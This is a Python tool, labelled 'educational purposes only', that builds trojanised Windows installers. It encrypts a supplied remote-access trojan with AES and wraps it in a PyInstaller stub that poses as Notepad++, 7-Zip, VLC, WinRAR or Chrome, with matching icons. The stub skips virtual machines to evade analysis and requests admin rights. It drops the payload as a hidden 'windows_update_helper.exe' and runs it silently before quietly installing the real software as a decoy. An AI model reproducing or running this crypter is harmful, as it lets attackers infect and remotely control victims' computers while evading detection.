#!/usr/bin/env python3
"""
Complete RAT Bundle Creator with Icon Support - Educational Purposes Only
Creates an undetectable payload bundle hidden within legitimate software
"""

import os
import sys
import subprocess
import requests
import tempfile
import shutil
import zipfile
import base64
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import ctypes
import time

class Colors:
    RED = '\033[38;5;196m'
    GREEN = '\033[38;5;46m'
    YELLOW = '\033[38;5;226m'
    BLUE = '\033[38;5;33m'
    PURPLE = '\033[38;5;129m'
    CYAN = '\033[38;5;51m'
    ORANGE = '\033[38;5;208m'
    PINK = '\033[38;5;205m'
    WHITE = '\033[38;5;255m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def print_banner():
    banner = f"""
{Colors.PURPLE}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║    ██████╗  █████╗ ████████╗    ██████╗ ██████╗ ██╗   ██╗███████╗██████╗    ║
║    ██╔══██╗██╔══██╗╚══██╔══╝    ██╔══██╗██╔══██╗██║   ██║██╔════╝██╔══██╗   ║
║    ██████╔╝███████║   ██║       ██████╔╝██████╔╝██║   ██║█████╗  ██████╔╝   ║
║    ██╔══██╗██╔══██║   ██║       ██╔══██╗██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗   ║
║    ██║  ██║██║  ██║   ██║       ██████╔╝██║  ██║ ╚████╔╝ ███████╗██║  ██║   ║
║    ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝       ╚═════╝ ╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝   ║
║                                                                              ║
║    {Colors.CYAN}Advanced Payload Bundle Creator with Stealth Technology{Colors.PURPLE}           ║
║    {Colors.RED}                 FOR EDUCATIONAL PURPOSES ONLY{Colors.PURPLE}                   ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Colors.RESET}
"""
    print(banner)

def print_status(message):
    print(f"{Colors.BOLD}{Colors.BLUE}[{Colors.CYAN}*{Colors.BLUE}]{Colors.RESET} {message}")

def print_success(message):
    print(f"{Colors.BOLD}{Colors.GREEN}[{Colors.WHITE}+{Colors.GREEN}]{Colors.RESET} {message}")

def print_warning(message):
    print(f"{Colors.BOLD}{Colors.YELLOW}[{Colors.ORANGE}!{Colors.YELLOW}]{Colors.RESET} {message}")

def print_error(message):
    print(f"{Colors.BOLD}{Colors.RED}[{Colors.PINK}-{Colors.RED}]{Colors.RESET} {message}")

def print_info(message):
    print(f"{Colors.BOLD}{Colors.CYAN}[{Colors.BLUE}i{Colors.CYAN}]{Colors.RESET} {message}")

def print_step(step, message):
    print(f"{Colors.BOLD}{Colors.PURPLE}[{Colors.WHITE}{step}{Colors.PURPLE}]{Colors.RESET} {message}")

def get_user_choice(options, prompt):
    """Get user choice from a list of options"""
    print(f"\n{Colors.BOLD}{Colors.CYAN}{prompt}{Colors.RESET}")
    for i, option in enumerate(options, 1):
        print(f"{Colors.YELLOW}{i}.{Colors.RESET} {option}")
    
    while True:
        try:
            choice = int(input(f"\n{Colors.BOLD}{Colors.WHITE}Enter your choice (number): {Colors.RESET}"))
            if 1 <= choice <= len(options):
                return options[choice-1]
            else:
                print_error("Invalid choice. Please try again.")
        except ValueError:
            print_error("Please enter a valid number.")

class CustomCrypter:
    def __init__(self, key=None):
        self.key = key or get_random_bytes(32)
        self.iv = get_random_bytes(16)
    
    def encrypt_data(self, data):
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        padded_data = pad(data, AES.block_size)
        encrypted_data = cipher.encrypt(padded_data)
        return self.iv + encrypted_data
    
    def decrypt_data(self, encrypted_data):
        iv = encrypted_data[:16]
        actual_data = encrypted_data[16:]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        decrypted_data = cipher.decrypt(actual_data)
        return unpad(decrypted_data, AES.block_size)
    
    def encrypt_file(self, input_path, output_path):
        with open(input_path, 'rb') as f:
            plaintext = f.read()
        encrypted_data = self.encrypt_data(plaintext)
        with open(output_path, 'wb') as f:
            f.write(encrypted_data)

class BundleCreator:
    def __init__(self):
        self.temp_dir = tempfile.mkdtemp(prefix="bundle_")
        self.work_dir = Path(self.temp_dir)
        self.crypter = CustomCrypter()
        
    def cleanup(self):
        try:
            shutil.rmtree(self.temp_dir)
        except:
            pass
    
    def download_software(self, software_type):
        urls = {
            "notepad++": "https://github.com/notepad-plus-plus/notepad-plus-plus/releases/download/v8.5/npp.8.5.Installer.x64.exe",
            "7zip": "https://www.7-zip.org/a/7z2301-x64.exe",
            "vlc": "https://get.videolan.org/vlc/3.0.20/win64/vlc-3.0.20-win64.exe",
            "winrar": "https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-624.exe",
            "chrome": "https://dl.google.com/tag/s/dl/chrome/install/googlechromestandaloneenterprise64.msi"
        }
        
        url = urls.get(software_type.lower(), urls["notepad++"])
        output_path = self.work_dir / f"{software_type}_installer.exe"
        
        try:
            print_status(f"Downloading {software_type} installer...")
            response = requests.get(url, stream=True, timeout=30)
            response.raise_for_status()
            
            with open(output_path, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
            
            print_success(f"Downloaded: {output_path}")
            return output_path
        except Exception as e:
            print_error(f"Download failed: {e}")
            return None

    def download_icon(self, software_type):
        icon_urls = {
            "notepad++": "https://raw.githubusercontent.com/notepad-plus-plus/notepad-plus-plus/master/powereditor/visual.net/notepadplusplus.ico",
            "7zip": "https://raw.githubusercontent.com/jacky-2025/icons/main/7zip.ico",
            "vlc": "https://raw.githubusercontent.com/jacky-2025/icons/main/vlc.ico",
            "winrar": "https://raw.githubusercontent.com/jacky-2025/icons/main/winrar.ico",
            "chrome": "https://raw.githubusercontent.com/jacky-2025/icons/main/chrome.ico"
        }
        
        url = icon_urls.get(software_type.lower(), icon_urls["notepad++"])
        output_path = self.work_dir / f"{software_type}.ico"
        
        try:
            print_status(f"Downloading {software_type} icon...")
            response = requests.get(url, stream=True, timeout=30)
            response.raise_for_status()
            
            with open(output_path, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
            
            print_success(f"Downloaded icon: {output_path}")
            return output_path
        except Exception as e:
            print_error(f"Icon download failed: {e}")
            return None

    def create_stub_script(self, software_type):
        stub_code = f'''#!/usr/bin/env python3
import os
import sys
import tempfile
import subprocess
import ctypes
import time
from pathlib import Path

# Encrypted payload data
ENCRYPTED_PAYLOAD = {repr(self.get_encrypted_payload())}

class Decrypter:
    def __init__(self, key):
        self.key = key
    
    def decrypt_data(self, encrypted_data):
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import unpad
        iv = encrypted_data[:16]
        actual_data = encrypted_data[16:]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        decrypted_data = cipher.decrypt(actual_data)
        return unpad(decrypted_data, AES.block_size)

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def check_vm():
    """Simple VM detection"""
    vm_indicators = [
        "vbox", "vmware", "virtualbox", "qemu", "xen", "hyper-v"
    ]
    
    try:
        computer_name = os.environ.get("COMPUTERNAME", "").lower()
        username = os.environ.get("USERNAME", "").lower()
        
        for indicator in vm_indicators:
            if indicator in computer_name or indicator in username:
                return True
                
    except:
        pass
    
    return False

def main():
    # Basic anti-analysis checks
    if check_vm():
        sys.exit(0)
    
    # Try to get admin privileges
    if not is_admin():
        try:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            sys.exit(0)
        except:
            pass
    
    key = {repr(self.crypter.key)}
    decrypter = Decrypter(key)
    
    try:
        decrypted_data = decrypter.decrypt_data(ENCRYPTED_PAYLOAD)
        temp_dir = tempfile.gettempdir()
        payload_path = str(Path(temp_dir) / "windows_update_helper.exe")
        
        with open(payload_path, 'wb') as f:
            f.write(decrypted_data)
        
        # Make file hidden
        try:
            ctypes.windll.kernel32.SetFileAttributesW(payload_path, 2)
        except:
            pass
        
        # Execute the payload silently
        subprocess.Popen(
            [payload_path],
            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
            shell=False
        )
        
        # Install legitimate software (silent mode)
        legit_installer_path = str(Path(__file__).parent / "{software_type}_installer.exe")
        if os.path.exists(legit_installer_path):
            if software_type == "chrome":
                subprocess.Popen(
                    ["msiexec", "/i", legit_installer_path, "/quiet", "/norestart"],
                    creationflags=subprocess.CREATE_NO_WINDOW,
                    shell=False
                )
            else:
                subprocess.Popen(
                    [legit_installer_path, "/S"],
                    creationflags=subprocess.CREATE_NO_WINDOW,
                    shell=False
                )
        
        # Cleanup after execution
        time.sleep(10)
        try:
            os.remove(payload_path)
        except:
            pass
            
    except Exception as e:
        # Fail silently
        pass

if __name__ == "__main__":
    main()
'''
        return stub_code

    def get_encrypted_payload(self):
        # This will be set after encryption
        return b''

    def build_bundle(self, rat_path, software_type="notepad++", output_name=None, icon_path=None):
        try:
            if not output_name:
                output_name = f"{software_type.capitalize()}_Installer.exe"
            
            if not os.path.exists(rat_path):
                print_error(f"RAT file not found: {rat_path}")
                return False
            
            # Download legitimate software
            legit_path = self.download_software(software_type)
            if not legit_path:
                return False
            
            # Download or use provided icon
            if icon_path and os.path.exists(icon_path):
                final_icon_path = Path(icon_path)
                print_success(f"Using custom icon: {final_icon_path}")
            else:
                final_icon_path = self.download_icon(software_type)
                if not final_icon_path:
                    print_warning("Proceeding without icon")
                    final_icon_path = None
            
            # Encrypt RAT payload
            print_status("Encrypting RAT payload with AES-256...")
            encrypted_rat_path = self.work_dir / "encrypted_rat.bin"
            self.crypter.encrypt_file(rat_path, encrypted_rat_path)
            
            # Read encrypted payload
            with open(encrypted_rat_path, 'rb') as f:
                encrypted_payload = f.read()
            
            # Create stub with actual payload
            self.get_encrypted_payload = lambda: encrypted_payload
            stub_code = self.create_stub_script(software_type)
            
            stub_path = self.work_dir / "stub.py"
            with open(stub_path, 'w', encoding='utf-8') as f:
                f.write(stub_code)
            
            # Build with PyInstaller
            print_status("Building executable with PyInstaller...")
            build_cmd = [
                sys.executable, "-m", "PyInstaller",
                "--onefile",
                "--noconsole",
                "--name", output_name,
                "--add-data", f"{legit_path};.",
            ]
            
            # Add icon if available
            if final_icon_path:
                build_cmd.extend(["--icon", str(final_icon_path)])
            
            build_cmd.append(str(stub_path))
            
            result = subprocess.run(build_cmd, cwd=self.work_dir, capture_output=True, text=True)
            
            if result.returncode != 0:
                print_error("Build failed!")
                print_error(result.stderr)
                return False
            
            # Move final executable
            dist_path = self.work_dir / "dist" / output_name
            if dist_path.exists():
                final_path = Path.cwd() / output_name
                shutil.move(str(dist_path), str(final_path))
                
                # Show file information
                file_size = os.path.getsize(final_path) / (1024 * 1024)  # MB
                
                print_success(f"Bundle created successfully: {final_path}")
                print_info(f"File size: {file_size:.2f} MB")
                print_info(f"Software: {software_type}")
                print_info("Icon: Included" if final_icon_path else "Icon: Default")
                print_info("Encryption: AES-256-CBC")
                print_info("Stealth Level: High")
                
                return True
            
            return False
                
        except Exception as e:
            print_error(f"Error: {e}")
            return False
        finally:
            self.cleanup()

def main():
    print_banner()
    
    # Check if RAT file is provided as argument
    rat_path = None
    if len(sys.argv) > 1:
        rat_path = sys.argv[1]
        if not os.path.exists(rat_path):
            print_error(f"RAT file not found: {rat_path}")
            sys.exit(1)
    
    print_step("1", "Software Selection")
    software_options = ["Notepad++", "7-Zip", "VLC Media Player", "WinRAR", "Google Chrome"]
    software_type = get_user_choice(software_options, "Select software to bundle with:")
    
    print_step("2", "Output Configuration")
    output_name = input(f"\n{Colors.BOLD}{Colors.WHITE}Enter output filename (or press Enter for default): {Colors.RESET}").strip()
    if not output_name:
        output_name = f"{software_type}_Installer.exe"
    elif not output_name.endswith('.exe'):
        output_name += '.exe'
    
    print_step("3", "Icon Selection")
    icon_path = None
    use_custom_icon = input(f"\n{Colors.BOLD}{Colors.WHITE}Use custom icon? (y/N): {Colors.RESET}").strip().lower()
    if use_custom_icon == 'y':
        icon_path = input(f"{Colors.BOLD}{Colors.WHITE}Enter path to .ico file: {Colors.RESET}").strip()
        if icon_path and not os.path.exists(icon_path):
            print_warning("Icon file not found. Using default icon.")
            icon_path = None
    
    print_step("4", "Payload Configuration")
    # Get RAT path if not provided as argument
    if not rat_path:
        rat_path = input(f"\n{Colors.BOLD}{Colors.WHITE}Enter path to RAT executable: {Colors.RESET}").strip()
        if not os.path.exists(rat_path):
            print_error(f"RAT file not found: {rat_path}")
            sys.exit(1)
    
    # Confirm choices
    print(f"\n{Colors.BOLD}{Colors.PURPLE}╔══════════════════════════════════════════════════╗")
    print(f"║               CONFIGURATION SUMMARY              ║")
    print(f"╚══════════════════════════════════════════════════╝{Colors.RESET}")
    print(f"{Colors.CYAN}RAT File:{Colors.RESET} {rat_path}")
    print(f"{Colors.CYAN}Software:{Colors.RESET} {software_type}")
    print(f"{Colors.CYAN}Output:{Colors.RESET} {output_name}")
    print(f"{Colors.CYAN}Icon:{Colors.RESET} {'Custom' if icon_path else 'Default'}")
    print(f"{Colors.CYAN}Encryption:{Colors.RESET} AES-256-CBC")
    print(f"{Colors.CYAN}Stealth:{Colors.RESET} High")
    
    confirm = input(f"\n{Colors.BOLD}{Colors.WHITE}Proceed with build? (Y/n): {Colors.RESET}").strip().lower()
    if confirm == 'n':
        print("Build cancelled.")
        sys.exit(0)
    
    print_step("5", "Building Bundle")
    # Build the bundle
    creator = BundleCreator()
    success = creator.build_bundle(rat_path, software_type.lower(), output_name, icon_path)
    
    if success:
        print_success("Build completed successfully!")
        print_warning("FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY!")
        print_info("Use responsibly and ethically.")
    else:
        print_error("Build failed!")
        sys.exit(1)

if __name__ == "__main__":
    main()